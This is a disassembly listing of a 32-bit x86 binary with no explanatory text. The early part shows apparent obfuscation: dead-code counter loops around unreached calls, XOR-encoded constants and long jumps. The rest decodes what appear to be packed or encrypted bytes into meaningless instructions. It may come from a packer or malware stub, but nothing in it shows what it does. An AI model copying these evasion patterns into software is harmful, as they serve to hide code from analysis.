  41ba57:	push   DWORD PTR [ebp-0x24]
  41ba5a:	push   DWORD PTR [ebp-0x28]
  41ba5d:	call   DWORD PTR ds:0x42aa33
  41ba63:	mov    ecx,DWORD PTR ds:0x428e2f
  41ba69:	dec    ecx
  41ba6a:	mov    DWORD PTR ds:0x428e2f,ecx
  41ba70:	jmp    0x41ba38
  41ba75:	lea    eax,[ebp-0xc]
  41ba78:	and    DWORD PTR ds:0x428e5b,0x0
  41ba82:	jmp    0x41ba94
  41ba87:	mov    ecx,DWORD PTR ds:0x428e5b
  41ba8d:	inc    ecx
  41ba8e:	mov    DWORD PTR ds:0x428e5b,ecx
  41ba94:	cmp    DWORD PTR ds:0x428e5b,0x1d
  41ba9b:	jae    0x41bac3
  41baa1:	cmp    DWORD PTR ds:0x428e5b,0x2b
  41baa8:	jge    0x41bac3
  41baae:	jmp    0x41babe
  41bab3:	push   0x428e2f
  41bab8:	call   DWORD PTR ds:0x42aa37
  41babe:	jmp    0x41ba87
  41bac3:	mov    DWORD PTR [ebp-0x14],eax
  41bac6:	mov    eax,DWORD PTR [ebp-0xc]
  41bac9:	mov    esi,DWORD PTR ds:0x428e33
  41bacf:	or     DWORD PTR ds:0x428e6b,esi
  41bad5:	mov    edx,DWORD PTR [ebp-0x14]
  41bad8:	and    DWORD PTR ds:0x428e77,0x0
  41bae2:	jmp    0x41baf4
  41bae7:	mov    ecx,DWORD PTR ds:0x428e77
  41baed:	inc    ecx
  41baee:	mov    DWORD PTR ds:0x428e77,ecx
  41baf4:	cmp    DWORD PTR ds:0x428e77,0x19
  41bafb:	jae    0x41bb3b
  41bb01:	cmp    DWORD PTR ds:0x428e77,0x9
  41bb08:	jle    0x41bb3b
  41bb0e:	jmp    0x41bb1c
  41bb13:	push   DWORD PTR [ebp-0x28]
  41bb16:	call   DWORD PTR ds:0x42aa3b
  41bb1c:	cmp    DWORD PTR ds:0x428e77,0x8
  41bb23:	jne    0x41bb36
  41bb29:	mov    ecx,DWORD PTR ds:0x428e77
  41bb2f:	inc    ecx
  41bb30:	mov    DWORD PTR ds:0x428e77,ecx
  41bb36:	jmp    0x41bae7
  41bb3b:	mov    ecx,0x75108af
  41bb40:	mov    esi,DWORD PTR ds:0x428e33
  41bb46:	add    DWORD PTR ds:0x428e47,esi
  41bb4c:	xor    eax,ecx
  41bb4e:	sub    DWORD PTR ds:0x428e6f,0x2684
  41bb58:	add    eax,0x3272f6
  41bb5d:	mov    DWORD PTR [edx],eax
  41bb5f:	sbb    eax,eax
  41bb61:	mov    eax,ds:0x4281eb
  41bb66:	mov    DWORD PTR ds:0x428e8b,0x1a
  41bb70:	cmp    DWORD PTR ds:0x428e8b,0x0
  41bb77:	je     0x41bbcc
  41bb7d:	cmp    DWORD PTR ds:0x428e8b,0xd
  41bb84:	jge    0x41bbcc
  41bb8a:	jmp    0x41bba0
  41bb8f:	push   DWORD PTR [ebp-0x18]
  41bb92:	push   0x428eab
  41bb97:	push   DWORD PTR [ebp-0x10]
  41bb9a:	call   DWORD PTR ds:0x42aa3f
  41bba0:	cmp    DWORD PTR ds:0x428e8b,0xe
  41bba7:	jne    0x41bbba
  41bbad:	mov    edx,DWORD PTR ds:0x428e8b
  41bbb3:	dec    edx
  41bbb4:	mov    DWORD PTR ds:0x428e8b,edx
  41bbba:	mov    edx,DWORD PTR ds:0x428e8b
  41bbc0:	dec    edx
  41bbc1:	mov    DWORD PTR ds:0x428e8b,edx
  41bbc7:	jmp    0x41bb70
  41bbcc:	mov    edx,DWORD PTR [ebp-0x4]
  41bbcf:	or     esi,0x7d03
  41bbd5:	mov    eax,DWORD PTR [eax]
  41bbd7:	mov    DWORD PTR ds:0x428ebf,0x12
  41bbe1:	cmp    DWORD PTR ds:0x428ebf,0x0
  41bbe8:	je     0x41bc1d
  41bbee:	cmp    DWORD PTR ds:0x428ebf,0x18
  41bbf5:	jl     0x41bc1d
  41bbfb:	jmp    0x41bc0b
  41bc00:	push   0x428000
  41bc05:	call   DWORD PTR ds:0x42aa0b
  41bc0b:	mov    esi,DWORD PTR ds:0x428ebf
  41bc11:	dec    esi
  41bc12:	mov    DWORD PTR ds:0x428ebf,esi
  41bc18:	jmp    0x41bbe1
  41bc1d:	add    eax,DWORD PTR [edx]
  41bc1f:	mov    DWORD PTR [ebp-0x8],eax
  41bc22:	mov    esi,DWORD PTR [ebp+0x8]
  41bc25:	mov    eax,ds:0x428373
  41bc2a:	and    DWORD PTR ds:0x428e33,0x0
  41bc34:	jmp    0x41bc46
  41bc39:	mov    edx,DWORD PTR ds:0x428e33
  41bc3f:	inc    edx
  41bc40:	mov    DWORD PTR ds:0x428e33,edx
  41bc46:	cmp    DWORD PTR ds:0x428e33,0x1c
  41bc4d:	jae    0x41bc8f
  41bc53:	cmp    DWORD PTR ds:0x428e33,0x8
  41bc5a:	jbe    0x41bc8f
  41bc60:	jmp    0x41bc70
  41bc65:	push   0x428189
  41bc6a:	call   DWORD PTR ds:0x42aa0f
  41bc70:	cmp    DWORD PTR ds:0x428e33,0x7
  41bc77:	jne    0x41bc8a
  41bc7d:	mov    edx,DWORD PTR ds:0x428e33
  41bc83:	inc    edx
  41bc84:	mov    DWORD PTR ds:0x428e33,edx
  41bc8a:	jmp    0x41bc39
  41bc8f:	mov    eax,DWORD PTR [eax+0x198]
  41bc95:	and    DWORD PTR ds:0x428eaf,0x0
  41bc9f:	mov    edx,DWORD PTR ds:0x428eaf
  41bca5:	inc    edx
  41bca6:	mov    DWORD PTR ds:0x428eaf,edx
  41bcac:	cmp    DWORD PTR ds:0x428eaf,0x19
  41bcb3:	jbe    0x41bcd6
  41bcb9:	jmp    0x41bcc9
  41bcbe:	push   0x5031
  41bcc3:	call   DWORD PTR ds:0x42aa13
  41bcc9:	cmp    DWORD PTR ds:0x428eaf,0x10
  41bcd0:	jb     0x41bc9f
  41bcd6:	xor    esi,ecx
  41bcd8:	mov    edx,0x3272f6
  41bcdd:	add    esi,edx
  41bcdf:	mov    DWORD PTR ds:0x428e7f,0x53fd
  41bce9:	cmp    DWORD PTR [eax],esi
  41bceb:	mov    DWORD PTR ds:0x428e27,0x6856
  41bcf5:	je     0x41bd16
  41bcfb:	mov    DWORD PTR ds:0x428e6f,0x6d53
  41bd05:	mov    eax,DWORD PTR [eax]
  41bd07:	mov    DWORD PTR ds:0x428e5f,0xa8d
  41bd11:	jmp    0x420797
  41bd16:	or     DWORD PTR ds:0x428ec7,ecx
  41bd1c:	mov    eax,DWORD PTR [ebp+0x18]
  41bd1f:	mov    esi,DWORD PTR ds:0x428e47
  41bd25:	adc    esi,DWORD PTR ds:0x428eb3
  41bd2b:	mov    DWORD PTR ds:0x428e47,esi
  41bd31:	mov    esi,DWORD PTR [ebp+0x1c]
  41bd34:	add    DWORD PTR ds:0x428e7f,0x428e53
  41bd3e:	or     ebx,0xffffffff
  41bd41:	jmp    0x41e0ba
  41bd46:	scas   al,BYTE PTR es:[edi]
  41bd47:	fwait
  41bd48:	or     ah,BYTE PTR [esi+eax*1-0x1c]
  41bd4c:	mov    WORD PTR [ecx-0x36abec4b],ds
  41bd52:	outs   dx,DWORD PTR ds:[esi]
  41bd53:	clc    
  41bd54:	retf   
  41bd55:	fwait
  41bd56:	daa    
  41bd57:	std    
  41bd58:	add    BYTE PTR [ebx-0x7c7c9fd9],0x95
  41bd5f:	js     0x41bd8e
  41bd61:	sahf   
  41bd62:	fdiv   QWORD PTR [edx-0x79]
  41bd65:	adc    eax,0xadfd0efb
  41bd6a:	adc    DWORD PTR [ebp-0x2e],esp
  41bd6d:	test   BYTE PTR [ebx],bl
  41bd6f:	test   BYTE PTR [edi-0x1a],dh
  41bd72:	(bad)  
  41bd73:	es sahf 
  41bd75:	cmp    al,0x4a
  41bd77:	sar    DWORD PTR [eax+0x44],0x4d
  41bd7b:	add    BYTE PTR fs:[ebx+0x0],0x6e
  41bd80:	inc    esp
  41bd81:	mov    ecx,0xd55f0046
  41bd86:	enter  0x839d,0xd4
  41bd8a:	retf   
  41bd8b:	cmp    DWORD PTR [ecx-0x7b],ecx
  41bd8e:	and    DWORD PTR ss:[ebp+0x1b89e055],0xffffffd9
  41bd96:	xchg   ecx,eax
  41bd97:	loope  0x41bdd1
  41bd99:	push   ebx
  41bd9a:	lods   al,BYTE PTR ds:[esi]
  41bd9b:	sbb    al,0x82
  41bd9d:	mov    edi,DWORD PTR [ebx-0x3d]
  41bda0:	sub    esp,esi
  41bda2:	sbb    esi,DWORD PTR [edi-0x29]
  41bda5:	push   edi
  41bda6:	xchg   esi,eax
  41bda7:	and    eax,0x1acdaebb
  41bdac:	push   ds
  41bdad:	sub    dh,BYTE PTR [edi]
  41bdaf:	jnp    0x41bd76
  41bdb1:	idiv   DWORD PTR [edi]
  41bdb3:	push   cs
  41bdb4:	mov    dh,0xc3
  41bdb6:	adc    BYTE PTR [ebx-0xde587d5],ah
  41bdbc:	aas    
  41bdbd:	sub    bh,al
  41bdbf:	sbb    dl,BYTE PTR [ebx]
  41bdc1:	int    0x1d
  41bdc3:	fs sti 
  41bdc5:	cmp    ch,ah
  41bdc7:	jnp    0x41be0f
  41bdc9:	ins    DWORD PTR es:[edi],dx
  41bdca:	cmc    
  41bdcb:	or     eax,0x37c35802
  41bdd0:	jmp    0x41be42
  41bdd2:	dec    edx
  41bdd3:	inc    ebp
  41bdd4:	out    0xa8,eax
  41bdd6:	in     eax,0x15
  41bdd8:	or     eax,0xc125f053
  41bddd:	push   cs
  41bdde:	jge    0x41be32
  41bde0:	lds    ecx,FWORD PTR [esi+0x717b4775]
  41bde6:	(bad)  
  41bde7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bde8:	leave  
  41bde9:	xchg   ebx,eax
  41bdea:	mov    eax,ds:0x2a4b4a67
  41bdef:	pop    edx
  41bdf0:	push   ss
  41bdf1:	clc    
  41bdf2:	mov    ?,WORD PTR [ebx+0x679f59d7]
  41bdf8:	ja     0x41bdc0
  41bdfa:	dec    ah
  41bdfc:	jne    0x41bd94
  41bdfe:	fwait
  41bdff:	xor    ah,0xae
  41be02:	ins    DWORD PTR es:[edi],dx
  41be03:	lds    edi,FWORD PTR [ebx+0x1a]
  41be06:	push   es
  41be07:	xor    eax,0xefca2cf4
  41be0c:	or     eax,DWORD PTR [eax-0x30]
  41be0f:	inc    ebp
  41be10:	xchg   ebp,eax
  41be11:	scas   eax,DWORD PTR es:[edi]
  41be12:	push   es
  41be13:	call   0x33adce57
  41be18:	mov    BYTE PTR [esi],ch
  41be1a:	adc    ebp,DWORD PTR [eax+0x1afa20a3]
  41be20:	and    bl,al
  41be22:	into   
  41be23:	sub    DWORD PTR cs:[eax-0x17],edi
  41be27:	aaa    
  41be28:	and    bl,bl
  41be2a:	lahf   
  41be2b:	adc    al,0x17
  41be2d:	cmp    al,0x79
  41be2f:	and    esi,DWORD PTR [edx]
  41be31:	or     BYTE PTR [eax],bl
  41be33:	lds    esi,FWORD PTR [edx+0x2b03f1d]
  41be39:	sub    esp,ecx
  41be3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be3c:	mov    ebx,0x918931bf
  41be41:	fild   QWORD PTR [esi]
  41be43:	xchg   esi,eax
  41be44:	or     esp,0x19
  41be47:	and    al,0x96
  41be49:	js     0x41be4a
  41be4b:	mov    dh,0xbf
  41be4d:	cwde   
  41be4e:	push   eax
  41be4f:	(bad)  
  41be50:	xlat   BYTE PTR ds:[ebx]
  41be51:	enter  0x1aa1,0x28
  41be55:	mov    bl,0xe6
  41be57:	test   edi,ebp
  41be59:	sbb    eax,0x5a34b1
  41be5e:	pop    eax
  41be5f:	addr16 mov ds:0xcdc5,eax
  41be63:	inc    ebp
  41be64:	jae    0x41be0d
  41be66:	push   ebx
  41be67:	popa   
  41be68:	dec    ebp
  41be69:	mov    al,ds:0xc88569a2
  41be6e:	pop    esi
  41be6f:	hlt    
  41be70:	fsub   st(4),st
  41be72:	iret   
  41be73:	or     al,0x81
  41be75:	aam    0x69
  41be77:	xchg   edx,eax
  41be78:	sar    ecx,cl
  41be7a:	cmp    DWORD PTR [ecx-0x4473d68],ebp
  41be80:	in     eax,dx
  41be81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be82:	call   0xde5c:0xddd5973d
  41be89:	xchg   esi,eax
  41be8a:	(bad)  
  41be8b:	sar    DWORD PTR [edx],cl
  41be8d:	clc    
  41be8e:	cwde   
  41be8f:	push   esi
  41be90:	sbb    esp,DWORD PTR [eax]
  41be92:	jns    0x41be5e
  41be94:	ins    BYTE PTR es:[edi],dx
  41be95:	xor    DWORD PTR [ebp+0x66],esp
  41be98:	push   ecx
  41be99:	or     esp,ecx
  41be9b:	pop    ds
  41be9c:	jns    0x41beaa
  41be9e:	outs   dx,DWORD PTR ds:[esi]
  41be9f:	fwait
  41bea0:	xor    ebx,DWORD PTR [ebp-0x24]
  41bea3:	repnz mov eax,ds:0x3a764e8f
  41bea9:	or     DWORD PTR [esi-0x634ff86c],0xffffffa6
  41beb0:	mov    esp,gs
  41beb2:	mov    ebx,0xc864df1e
  41beb7:	xchg   BYTE PTR [ebp+0x9],cl
  41beba:	(bad)  
  41bebb:	jecxz  0x41befc
  41bebd:	mov    ah,0xcb
  41bebf:	ja     0x41bebb
  41bec1:	sbb    BYTE PTR [ebx-0x6192ade5],0xaa
  41bec8:	rcr    al,0xc1
  41becb:	cmp    edx,DWORD PTR [esi]
  41becd:	or     eax,0xb835eb80
  41bed2:	sbb    ebp,DWORD PTR [ebp-0x7e4965be]
  41bed8:	mov    dh,0x41
  41beda:	inc    eax
  41bedb:	jmp    0x65f5112e
  41bee0:	cmp    ch,BYTE PTR [ecx]
  41bee2:	rcr    dh,0x8b
  41bee5:	mov    cl,0x73
  41bee7:	sar    DWORD PTR [edi-0x58],1
  41beea:	shl    BYTE PTR [eax],cl
  41beec:	loop   0x41bf3b
  41beee:	stos   BYTE PTR es:[edi],al
  41beef:	jmp    0x6fda3b04
  41bef4:	shl    BYTE PTR [ebx-0x6b4b0558],1
  41befa:	jmp    0xc8bc:0x37767e0e
  41bf01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf02:	fwait
  41bf03:	out    0xd1,eax
  41bf05:	popa   
  41bf06:	adc    DWORD PTR [ecx+0x52],edx
  41bf09:	push   cs
  41bf0a:	shl    DWORD PTR [ecx+0x4be4d1c0],0x55
  41bf11:	jmp    0x62d3:0x5c407db6
  41bf18:	jmp    0x41bf8f
  41bf1a:	ds fwait
  41bf1c:	xchg   bl,bh
  41bf1e:	ins    BYTE PTR es:[edi],dx
  41bf1f:	jb     0x41bef6
  41bf21:	or     DWORD PTR cs:[eax+0x31b9f570],edi
  41bf28:	sbb    BYTE PTR [ebp+0x1641211f],0x76
  41bf2f:	sub    esi,DWORD PTR [edx-0x68cf3918]
  41bf35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf36:	push   ss
  41bf37:	sbb    ecx,DWORD PTR [ecx-0x3e137506]
  41bf3d:	test   eax,0xaa66a812
  41bf42:	push   ss
  41bf43:	xor    ebp,ebx
  41bf45:	test   BYTE PTR [edi],dl
  41bf47:	push   es
  41bf48:	aaa    
  41bf49:	push   edi
  41bf4a:	data16 sbb al,0xb3
  41bf4d:	call   0x1411:0xaf97893f
  41bf54:	push   edi
  41bf55:	jne    0x41bef1
  41bf57:	mov    BYTE PTR [ebx],al
  41bf59:	lock xchg ecx,eax
  41bf5b:	inc    edi
  41bf5c:	fidiv  DWORD PTR [ebx-0x73]
  41bf5f:	inc    ebp
  41bf60:	add    dl,BYTE PTR [edi-0x12c0859b]
  41bf66:	sub    DWORD PTR [edx-0x63181d07],ebp
  41bf6c:	xchg   esp,eax
  41bf6d:	adc    DWORD PTR [edi-0x498fc321],esi
  41bf73:	adc    ah,BYTE PTR [ebp+0x1e]
  41bf76:	dec    eax
  41bf77:	bound  ecx,QWORD PTR [edi+0x72f46b68]
  41bf7d:	scas   eax,DWORD PTR es:[edi]
  41bf7e:	push   esi
  41bf7f:	je     0x41bf60
  41bf81:	push   esp
  41bf82:	or     eax,0xc2e4e66f
  41bf87:	in     eax,dx
  41bf88:	jle    0x41c002
  41bf8a:	loop   0x41bfe4
  41bf8c:	sbb    DWORD PTR [ecx],ebx
  41bf8e:	gs es xor eax,0x47a57130
  41bf95:	nop
  41bf96:	daa    
  41bf97:	dec    esi
  41bf98:	dec    ebp
  41bf99:	jne    0x41bfe6
  41bf9b:	leave  
  41bf9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf9d:	js     0x41bf4a
  41bf9f:	std    
  41bfa0:	xor    eax,0x69b34d04
  41bfa5:	repz retf 
  41bfa7:	sub    ebp,DWORD PTR [esi+0x73]
  41bfaa:	clc    
  41bfab:	dec    edx
  41bfac:	xchg   ecx,eax
  41bfad:	ret    
  41bfae:	fist   WORD PTR [ecx+0x55add79d]
  41bfb4:	ror    DWORD PTR [ecx*2+0x210313bb],0x4a
  41bfbc:	fbstp  TBYTE PTR [edi]
  41bfbe:	lea    dx,[edx+0xa490957]
  41bfc5:	push   0x45bc74be
  41bfca:	pushf  
  41bfcb:	xchg   BYTE PTR [ecx-0xd],ch
  41bfce:	jae    0x41c005
  41bfd0:	test   DWORD PTR [eax-0x5e],eax
  41bfd3:	cs cld 
  41bfd5:	push   ebx
  41bfd6:	(bad)  
  41bfd7:	cmp    al,0x0
  41bfd9:	ret    
  41bfda:	push   esp
  41bfdb:	xchg   BYTE PTR [eax],ah
  41bfdd:	stos   BYTE PTR es:[edi],al
  41bfde:	and    esi,DWORD PTR [ebx-0x55]
  41bfe1:	bound  edi,QWORD PTR [eax]
  41bfe3:	add    eax,0xab22a76b
  41bfe8:	mov    al,ds:0xccc529ea
  41bfed:	leave  
  41bfee:	xor    ah,bl
  41bff0:	pop    ebx
  41bff1:	std    
  41bff2:	sbb    eax,0xb0b916ac
  41bff7:	push   ds
  41bff8:	loopne 0x41bff7
  41bffa:	xchg   DWORD PTR [eax+ecx*8],ebx
  41bffd:	pop    eax
  41bffe:	xchg   edx,eax
  41bfff:	sbb    edi,DWORD PTR [ebx-0x1d267e4e]
  41c005:	iret   
  41c006:	pop    ss
  41c007:	clc    
  41c008:	stc    
  41c009:	mov    ax,0x1bbb
  41c00d:	mov    al,ds:0x9d568009
  41c012:	ds es pop ds
  41c015:	inc    ecx
  41c016:	mov    ds:0xad80cb4a,eax
  41c01b:	push   edi
  41c01c:	ins    BYTE PTR es:[edi],dx
  41c01d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c01e:	adc    eax,0xaf5d5d5e
  41c023:	xchg   BYTE PTR [ebp-0x21b0d9c],ch
  41c029:	adc    DWORD PTR [edi-0x72c34d7b],edi
  41c02f:	cdq    
  41c030:	enter  0x3b05,0x89
  41c034:	inc    edi
  41c035:	xchg   edx,eax
  41c036:	stos   DWORD PTR es:[edi],eax
  41c037:	xchg   DWORD PTR [ebx-0x58],edi
  41c03a:	sub    esp,DWORD PTR [edx]
  41c03c:	mov    cl,0x1
  41c03e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c03f:	cmp    BYTE PTR [ebx],bh
  41c041:	adc    eax,0x3b193df1
  41c046:	sbb    ch,BYTE PTR [edx]
  41c048:	bound  esp,QWORD PTR [ebp+0x55]
  41c04b:	mov    ecx,esp
  41c04d:	psrld  mm3,mm7
  41c050:	xor    BYTE PTR [esi-0x6cb170a],ch
  41c056:	push   edi
  41c057:	xchg   esi,eax
  41c058:	out    0x98,eax
  41c05a:	retf   
  41c05b:	jle    0x41c06c
  41c05d:	sub    ebx,DWORD PTR [eax+0x50]
  41c060:	inc    ebp
  41c061:	ins    DWORD PTR es:[edi],dx
  41c062:	arpl   WORD PTR [esi-0x59],si
  41c065:	sub    DWORD PTR [edx],edi
  41c067:	xchg   dx,ax
  41c069:	push   ebp
  41c06a:	test   DWORD PTR [eax+0x74],0x9baa7760
  41c071:	sub    al,0x2
  41c073:	das    
  41c074:	jp     0x41c064
  41c076:	loope  0x41c05b
  41c078:	lds    edx,FWORD PTR cs:[edx+0x7469d11]
  41c07f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c080:	and    bl,dl
  41c082:	mov    dl,0xea
  41c084:	xor    ch,cl
  41c086:	sti    
  41c087:	mov    dh,0x50
  41c089:	jnp    0x41c050
  41c08b:	push   0xffffffa6
  41c08d:	and    dl,bh
  41c08f:	adc    eax,0x9eb5ce07
  41c094:	pop    ds
  41c095:	shr    DWORD PTR [ecx+ebp*8-0x54186105],1
  41c09c:	cmc    
  41c09d:	jnp    0x41c028
  41c09f:	in     eax,0x4d
  41c0a1:	clc    
  41c0a2:	pop    edx
  41c0a3:	or     DWORD PTR [eax-0x1c437585],eax
  41c0a9:	in     eax,0x4
  41c0ab:	lods   eax,DWORD PTR ds:[esi]
  41c0ac:	in     al,dx
  41c0ad:	mov    esi,0x935eb6b9
  41c0b2:	into   
  41c0b3:	adc    al,0x50
  41c0b5:	adc    al,0x1e
  41c0b7:	cwd    
  41c0b9:	repnz rol DWORD PTR [ebx-0x14],0x50
  41c0be:	enter  0x2bac,0x69
  41c0c2:	popf   
  41c0c3:	mov    dl,0xd0
  41c0c5:	push   es
  41c0c6:	jmp    0xb3f7:0x3043e0b3
  41c0cd:	mov    edx,0x2579cb57
  41c0d2:	fwait
  41c0d3:	pop    ss
  41c0d4:	repz mov ch,0xa9
  41c0d7:	out    0xe,al
  41c0d9:	sub    al,0x60
  41c0db:	add    DWORD PTR [ecx-0x25],0xffffffbb
  41c0df:	or     DWORD PTR [esi+0x50],ebp
  41c0e2:	cmp    dl,BYTE PTR [ebx-0x1732fb5a]
  41c0e8:	das    
  41c0e9:	rcl    DWORD PTR [edi-0x64],0xda
  41c0ed:	xor    eax,0x918dba8c
  41c0f2:	std    
  41c0f3:	int    0xcc
  41c0f5:	aas    
  41c0f6:	or     ch,cl
  41c0f8:	push   ebx
  41c0f9:	retf   0xf21f
  41c0fc:	mov    ds:0xc1f709e2,eax
  41c101:	mov    al,0x4d
  41c103:	push   0x3b
  41c105:	(bad)  
  41c107:	stos   DWORD PTR es:[edi],eax
  41c108:	push   edi
  41c109:	and    al,0xf7
  41c10b:	pop    eax
  41c10c:	lfs    edx,FWORD PTR [ebx]
  41c10f:	mov    ch,0x36
  41c111:	imul   ebx,DWORD PTR [ebp-0x56],0x6b1b6a64
  41c118:	lods   eax,DWORD PTR ds:[esi]
  41c119:	in     eax,dx
  41c11a:	sub    al,0x36
  41c11c:	loopne 0x41c0c1
  41c11e:	div    DWORD PTR [ebp+0x4b80d8b0]
  41c124:	xchg   BYTE PTR [esi-0x46f78345],ch
  41c12a:	(bad)  
  41c12b:	or     ebx,esp
  41c12d:	(bad)  
  41c12e:	fxch   st(5)
  41c130:	xchg   DWORD PTR [eax+0x47df6320],edx
  41c136:	cmp    dl,ch
  41c138:	mov    ebp,0xaed3e0f4
  41c13d:	cmp    al,0x21
  41c13f:	out    dx,eax
  41c140:	aam    0x26
  41c142:	lea    edx,[esi-0x1bac5ace]
  41c148:	jmp    0x1df988a0
  41c14d:	cmp    BYTE PTR [eax],bl
  41c14f:	dec    ebp
  41c150:	xor    eax,0x14e48818
  41c155:	pop    ebx
  41c156:	sub    eax,0x1b39b54
  41c15b:	aaa    
  41c15c:	lds    eax,FWORD PTR [esi+0x5481891]
  41c162:	aas    
  41c163:	ret    0xd689
  41c166:	sar    al,1
  41c168:	sub    eax,DWORD PTR [edi]
  41c16a:	inc    eax
  41c16b:	cmp    ch,ch
  41c16d:	fist   WORD PTR [edx]
  41c16f:	xor    esi,DWORD PTR [esi+0x3770e9cd]
  41c175:	cmp    eax,DWORD PTR [ecx+0x7bbabc05]
  41c17b:	inc    eax
  41c17c:	jl     0x41c13c
  41c17e:	sub    eax,DWORD PTR [ecx+0x66cbe66f]
  41c184:	(bad)  
  41c185:	cli    
  41c186:	xchg   BYTE PTR [ebx+0x27648547],cl
  41c18c:	push   ebx
  41c18d:	ror    BYTE PTR cs:[esi+ebp*8+0x29791e04],cl
  41c195:	es pop ebp
  41c197:	pop    edi
  41c198:	adc    esi,DWORD PTR [esi]
  41c19a:	loope  0x41c196
  41c19c:	pop    es
  41c19d:	fild   WORD PTR [eax-0x7c143dd1]
  41c1a3:	sti    
  41c1a4:	pop    esi
  41c1a5:	inc    ecx
  41c1a6:	in     eax,0xa0
  41c1a8:	fwait
  41c1a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1aa:	and    edx,edi
  41c1ac:	xor    al,ch
  41c1ae:	push   esi
  41c1af:	cdq    
  41c1b0:	repz inc edi
  41c1b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1b3:	dec    esp
  41c1b4:	hlt    
  41c1b5:	in     al,dx
  41c1b6:	or     BYTE PTR [ecx],dl
  41c1b8:	adc    BYTE PTR [eax+ebp*8+0x1b34ecb9],ah
  41c1bf:	pop    es
  41c1c0:	cmp    al,0x52
  41c1c2:	xor    eax,eax
  41c1c4:	pop    esi
  41c1c5:	mov    ebp,DWORD PTR [ebx+0x7120912d]
  41c1cb:	xor    DWORD PTR [esi+0x777f5618],0x70
  41c1d2:	fs je  0x41c1eb
  41c1d5:	(bad)  
  41c1d6:	hlt    
  41c1d7:	and    BYTE PTR [edx+0x63d390ce],0xca
  41c1de:	ja     0x41c18b
  41c1e0:	pop    esi
  41c1e1:	inc    edx
  41c1e2:	mov    ah,0x6b
  41c1e4:	(bad)  
  41c1e5:	in     eax,0x4b
  41c1e7:	adc    al,bl
  41c1e9:	add    DWORD PTR [ebx-0x34],ecx
  41c1ec:	push   es
  41c1ed:	das    
  41c1ee:	mov    BYTE PTR [ecx],dh
  41c1f0:	jae    0x41c195
  41c1f2:	and    BYTE PTR [edi-0x20],0x7a
  41c1f6:	inc    ebx
  41c1f7:	clc    
  41c1f8:	push   esp
  41c1f9:	inc    esp
  41c1fa:	xchg   esp,eax
  41c1fb:	ja     0x41c1ea
  41c1fd:	or     ebp,DWORD PTR [edx]
  41c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c200:	pop    esi
  41c201:	mov    ebx,0x1314e7c7
  41c206:	ss inc ecx
  41c208:	cmp    al,0xdc
  41c20a:	aas    
  41c20b:	jne    0x41c227
  41c20d:	(bad)
  41c210:	clc    
  41c211:	sbb    edx,esi
  41c213:	cli    
  41c214:	jno    0x41c1ff
  41c216:	les    edx,FWORD PTR [ebx]
  41c218:	mov    eax,ds:0x615130d9
  41c21d:	and    esi,ebx
  41c21f:	aad    0x5c
  41c221:	add    al,0x56
  41c223:	loope  0x41c1f4
  41c225:	sti    
  41c226:	mov    esp,0x64bd4ce1
  41c22b:	call   0xeb67:0xf332e2a1
  41c232:	stc    
  41c233:	fs repnz mov dl,0x51
  41c237:	aas    
  41c238:	fbstp  TBYTE PTR ds:0x64abc0e5
  41c23e:	mov    bl,0xfa
  41c240:	jp     0x41c23d
  41c242:	retf   
  41c243:	not    BYTE PTR [esi]
  41c245:	pop    esp
  41c246:	and    BYTE PTR [edx],dh
  41c248:	jl     0x41c23d
  41c24a:	loopne 0x41c22e
  41c24c:	fcomp  QWORD PTR [eax+0x54]
  41c24f:	hlt    
  41c250:	ret    0xd381
  41c253:	mov    ?,WORD PTR [eax-0x5d]
  41c256:	imul   ebx,DWORD PTR [edx-0x6d],0xffffffd4
  41c25a:	nop
  41c25b:	mov    dh,dl
  41c25d:	ins    BYTE PTR es:[edi],dx
  41c25e:	clc    
  41c25f:	loopne 0x41c2da
  41c261:	jb     0x41c282
  41c263:	js     0x41c2b3
  41c265:	cmc    
  41c266:	in     eax,dx
  41c267:	xor    bl,al
  41c269:	call   0xf2276c35
  41c26e:	popf   
  41c26f:	frstor [ebx]
  41c271:	xor    edx,0x18
  41c274:	and    DWORD PTR [esi],edx
  41c276:	push   eax
  41c277:	cli    
  41c278:	add    al,0x4d
  41c27a:	pop    esp
  41c27b:	into   
  41c27c:	push   cs
  41c27d:	xor    eax,0x2a179c20
  41c282:	loope  0x41c283
  41c284:	rcl    DWORD PTR [eax+0x1b],cl
  41c287:	push   ecx
  41c288:	fs sub al,0x84
  41c28b:	(bad)  
  41c28c:	imul   eax
  41c28e:	stos   BYTE PTR es:[edi],al
  41c28f:	mov    ch,0x60
  41c291:	adc    ebx,DWORD PTR [edi+0x6527d2f6]
  41c297:	in     eax,0x39
  41c299:	xor    DWORD PTR [eax-0x30684ee1],esp
  41c29f:	cld    
  41c2a0:	dec    ebx
  41c2a1:	push   0x6cd2110a
  41c2a6:	mov    bl,0x94
  41c2a8:	retf   0x6783
  41c2ab:	shr    al,cl
  41c2ad:	je     0x41c2fc
  41c2af:	or     BYTE PTR [eax+0x2a],cl
  41c2b2:	or     ebx,DWORD PTR [ecx]
  41c2b4:	xor    bl,bh
  41c2b6:	test   al,0x25
  41c2b8:	push   ebp
  41c2b9:	xchg   DWORD PTR [esi+0x65f36bae],ebp
  41c2bf:	popf   
  41c2c0:	mov    al,ds:0xe2677bfd
  41c2c5:	nop
  41c2c6:	loop   0x41c306
  41c2c8:	jnp    0x41c26a
  41c2ca:	xor    al,0xda
  41c2cc:	(bad)  
  41c2cd:	outs   dx,DWORD PTR ds:[esi]
  41c2ce:	ins    BYTE PTR es:[edi],dx
  41c2cf:	leave  
  41c2d0:	and    al,0x64
  41c2d2:	sub    al,0x34
  41c2d4:	(bad)  
  41c2d5:	iret   
  41c2d6:	(bad)  
  41c2d7:	jmp    0x1e848ab7
  41c2dc:	dec    esi
  41c2dd:	pop    eax
  41c2de:	or     ebp,DWORD PTR [esi+0x2250c9e5]
